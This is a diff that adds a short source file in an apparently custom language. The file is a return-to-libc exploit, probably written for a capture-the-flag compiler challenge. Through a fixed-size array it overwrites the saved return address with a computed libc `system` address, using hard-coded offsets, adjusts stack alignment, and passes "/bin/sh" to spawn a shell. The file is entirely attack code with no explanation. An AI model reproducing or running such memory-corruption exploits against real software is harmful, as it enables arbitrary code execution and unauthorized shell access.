@@ -1,0 +1,17 @@
+fn str(x: *u8) i32 {
+    return 0;
+}
+
+fn main() i32 {
+    var arr: [128]u32 = {1, 2, 3};
+
+    // ret @ 171176
+    // libc_system @ 340240
+    arr[7] = arr[5] - 171176 + 340240;
+    arr[8] = arr[6];
+    // align stack
+    arr[5] = arr[5] - 171176 + 340284;
+    
+    str(&"/bin/sh");
+    return 0;
+}
